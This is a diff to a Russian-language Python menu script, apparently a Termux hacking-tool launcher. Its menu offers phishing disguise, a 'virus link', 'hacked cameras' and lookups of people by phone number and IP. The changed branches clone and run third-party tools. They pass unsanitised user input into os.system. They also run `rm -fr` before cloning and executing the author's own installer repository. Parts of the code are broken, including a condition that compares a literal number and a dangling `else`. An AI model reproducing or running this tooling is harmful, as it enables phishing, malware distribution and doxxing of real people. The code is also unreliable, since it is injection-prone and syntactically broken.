@@ -26,7 +26,7 @@ while True:
     print (Fore.YELLOW+"    [6] приветствие")
     print (Fore.YELLOW+"    [7] заблокировать Termux")
     print (Fore.YELLOW+"    [8] просмотр взломаных камер")
-    print (Fore.YELLOW+"    [9] получить вирус ссылку")
+    print (Fore.YELLOW+"    [9] вирус ссылка")
     print (Fore.YELLOW+"    [10] замаскировать фишинг")
     print (Fore.YELLOW+"    [11] пробив по номеру")
     print (Fore.YELLOW+"    [12] пробив по ip")
@@ -328,6 +328,10 @@ while True:
     if inp == '11':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив телефона...")
         res()
+        time.sleep(1.5)
+        os.system('clear')
+        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка файлов...")
+        res()
         os.system('git clone https://github.com/Wes974/PhoneInfoga')
         os.chdir('PhoneInfoga')
         os.system('pip install -r requirements.txt')
@@ -338,17 +342,22 @@ while True:
         if 1101 == '':
             os.system('clear')
             print('[вы ничего не ввели]')
-            time.sleep(3)
+            res()
+            tsu_1103 = input('[нажмите entr чтобы выйти]')
+
 
         else:
             os.system('clear')
             os.system('python phoneinfoga.py -n '+tsu_1101)
-            tsu_14 = input('[нажмите entr чтобы выйти]')
+            tsu_1103 = input('[нажмите entr чтобы выйти]')
 
 
     if inp == '12':
-        os.system('clear')
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка пробив по ip...")
+        res()
+        time.sleep(1.5)
+        os.system('clear')
+        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка файлов...")
         res()
         os.system('rm -fr IP-Tracer')
         os.system('git clone https://github.com/rajkumardusad/IP-Tracer.git')
@@ -404,16 +413,15 @@ while True:
         if tsu_1301 == '':
             os.system('clear')
             print('[вы ничего не ввели]')
-            time.sleep(3)
+            res()
+            tsu_1302 = input('[нажмите entr чтобы выйти]')
             os.system('cd && rm -fr installer && rm -fr installer.py && rm -fr tool.py && rm -fr fail.py && rm -fr zabava.py && git clone https://github.com/777-FOXik-777/installer && cd installer && python3 tool.py')
 
         else:
             os.system('clear')
             os.system('python3 main.py -u '+tsu_1301)
-            tsu_1302 = input('[нажмите entr чтобы выйти]')
-            if tsu_1302 =='':
-                os.system('clear')
-                os.system('cd && rm -fr installer && rm -fr installer.py && rm -fr tool.py && rm -fr fail.py && rm -fr zabava.py && git clone https://github.com/777-FOXik-777/installer && cd installer && python3 tool.py')
+            tsu_1303 = input('[нажмите entr чтобы выйти]')
+            os.system('cd && rm -fr installer && rm -fr installer.py && rm -fr tool.py && rm -fr fail.py && rm -fr zabava.py && git clone https://github.com/777-FOXik-777/installer && cd installer && python3 tool.py')
 
             else:
                 os.system('clear')
